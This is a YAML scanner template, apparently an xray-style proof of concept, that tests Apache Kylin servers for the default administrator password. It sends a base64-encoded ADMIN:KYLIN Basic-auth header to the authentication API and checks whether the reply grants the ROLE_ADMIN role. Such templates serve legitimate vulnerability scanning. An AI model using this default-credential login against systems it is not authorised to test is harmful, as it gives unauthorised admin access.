name: poc-yaml-apache-kylin-default-password
binding: b1194152-704f-4dd9-b667-d6eeb24c2f22
manual: true
detail:
    links:
        - http://kylin.apache.org/docs/gettingstarted/kylin-quickstart.html
    vulnerability:
        id: CT-159087
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /kylin/api/user/authentication
            headers:
                Authorization: Basic QURNSU46S1lMSU4=
                Content-Type: application/json
            body: '{}'
        expression: response.status == 200 && response.content_type.icontains("json") && response.body.bcontains(b"\"authority\":\"ROLE_ADMIN\"") && response.body.bcontains(b"userDetails")
expression: r0()
